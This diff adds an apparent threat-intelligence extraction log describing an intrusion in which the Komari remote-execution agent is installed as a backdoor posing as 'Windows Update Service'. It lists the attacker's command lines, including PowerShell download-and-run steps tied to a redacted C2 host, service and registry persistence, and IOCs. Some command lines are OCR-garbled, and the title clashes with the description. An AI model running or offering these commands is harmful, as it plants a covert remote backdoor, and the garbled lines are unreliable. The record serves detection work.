@@ -1,0 +1,51 @@
+# Failed YAML extraction
+# Timestamp: 2026-05-01T19:50:13.664312
+# Response length: 2761 chars
+# Input chunk preview: 'the project considers first-class. Zoom out from the three events, and the operational shape is straightforward: one controller, many agents, arbitrary command execution per agent. As Figure 12 demons'
+# ============================================================
+
+title: "Komari Remote Exec Panel Dispatching Invoke-AtomicTest T1003.001 Against Huntress Internal VM"
+description: A threat actor used stolen VPN credentials to pivot via Impacket's smbexec.py and installed Komari as a SYSTEM-level backdoor, masquerading as the Windows Update Service.
+attribution: ""
+malware_families: []
+cves: []
+ttps:
+  processes:
+    - cmd.exe
+    - powershell.exe
+    - nssm.exe
+    - komari-agent.exe
+  command_lines:
+    - "C:\WINDOWS\system32\cmd.exe /Q /c echo net start termservice > \\ C$\ _output_iDhLsdpD 2/>A&1 > C:AWINDOWS\PIYHZSEC,.bat & C:AWINDOWS\system32\cmd.exe /Q /cC:\WINDOWS\PIYHZSEC bat & del C:AWINDOWS\PIYHZSEC.bat"
+    - "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"iwr https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.ps1' -UseBasicParsing -OutFile install.ps1'; & .\\install.ps1' -e' http://[Malicious C2 Redacted]:55964 -t' 'vomtLDXyggveYfjFxdoo7Z' '--install-dir' 'C:\\Windows\\System32' '-install-service-name' 'Windows UpdateService'\""
+    - "nssm install Windows Update Service C:\WINDOWS\system32\komari-agent.exe -e http://[Malicious C2 Redacted]:55964 -t vomtLDXyggveYfjFxdoo7Z --install-dir C:\\Windows\\System32"
+  powershell:
+    - "iwr 'https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.ps1' -UseBasicParsing -OutFile 'install.ps1'; & '.\install.ps1' '-e' 'http://[Malicious C2 Redacted]:25774' '-t' 'vomtLDXyggveYfjFxdoo7Z' '--install-dir' 'C:\\Windows\\System32' '--install-service-name' 'Windows Update Service'"
+  scripts: []
+  registry_keys:
+    - "HKLM\System\CurrentControlSet\Services\Windows Update Service"
+    - "HKLM\System\CurrentControlSet\Services\Windows Update Service\Parameters\Application"
+    - "HKLM\System\CurrentControlSet\Services\Windows Update Service\Parameters\AppParameters"
+    - "HKLM\System\CurrentControlSet\Services\Windows Update Service\Parameters\AppDirectory"
+    - "HKLM\System\CurrentControlSet\Services\Windows Update Service\Parameters\AppRestartDelay"
+    - "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections"
+  image_loads: []
+  network_connections:
+    - "komari-agent.exe -> [Malicious C2 Redacted]:55964"
+  file_activity:
+    - "C:\Windows\System32\komari-agent.exe"
+    - "C:\Windows\Temp\aRhRnnHI.tmp"
+  persistence:
+    - "Registry Run key (HKLM) pointing to C:\Windows\System32\komari-agent.exe"
+  process_relations: []
+iocs:
+  hashes:
+    - 039e659ade3aa8ee7758c11fdb8fbfffd2491920046d638413cea2042f6d584c
+  ip_addresses:
+    - 45.153.34[.]132
+    - [Malicious C2 Redacted]: 55964
+    - 10.212.134[.]200
+  domains: []
+  urls:
+    - hxxps://raw.githubusercontent[.]com/komari-monitor/komari-agent/refs/heads/main/install.ps1
+authors: []
